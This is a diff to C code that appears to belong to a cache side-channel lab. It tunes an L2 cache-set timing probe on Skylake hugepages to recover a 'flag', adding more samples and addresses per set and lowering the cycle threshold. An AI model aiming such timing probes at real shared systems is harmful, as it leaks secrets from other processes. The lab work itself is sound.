@@ -7,18 +7,20 @@
 
 #define PAGE_SIZE (2 * 1024 * 1024) // 2MB Hugepage
 #define L2_CACHE_SETS 2048          // Number of L2 cache sets on Skylake
-#define SAMPLE_RUNS 50              // Number of samples to average timings
+#define SAMPLE_RUNS 100             // Increase number of samples to average timings
+#define ADDRESSES_PER_SET 8         // Probe multiple addresses per set
 
 // Function to compute average access time for a specific cache set
 uint64_t probe_set(volatile uint8_t *buf, int set_index) {
     uint64_t total_time = 0;
-    int samples = SAMPLE_RUNS;
 
-    for (int i = 0; i < samples; i++) {
-        volatile uint8_t *addr = buf + (set_index * 64) + (i * 4096);
-        total_time += measure_one_block_access_time((uint64_t)addr);  // <-- CAST TO uint64_t
+    for (int i = 0; i < SAMPLE_RUNS; i++) {
+        for (int j = 0; j < ADDRESSES_PER_SET; j++) {
+            volatile uint8_t *addr = buf + (set_index * 64) + (j * 4096);
+            total_time += measure_one_block_access_time((uint64_t)addr);
+        }
     }
-    return total_time / samples;
+    return total_time / (SAMPLE_RUNS * ADDRESSES_PER_SET);
 }
 
 int main(int argc, char const *argv[]) {
@@ -58,13 +60,13 @@ int main(int argc, char const *argv[]) {
         }
 
         // Basic filtering to avoid noise: only print if confident
-        if (max_time > 200) { // 200 cycles threshold (adjust if needed)
+        if (max_time > 150) { // lower threshold because averaging more
             flag = candidate_flag;
             printf("Flag: %d\n", flag);
             break; // Successfully found the flag, exit
         }
 
-        usleep(1000); // Sleep 1ms and try again if not confident
+        usleep(500); // Sleep 0.5ms and try again if not confident
     }
 
     return 0;
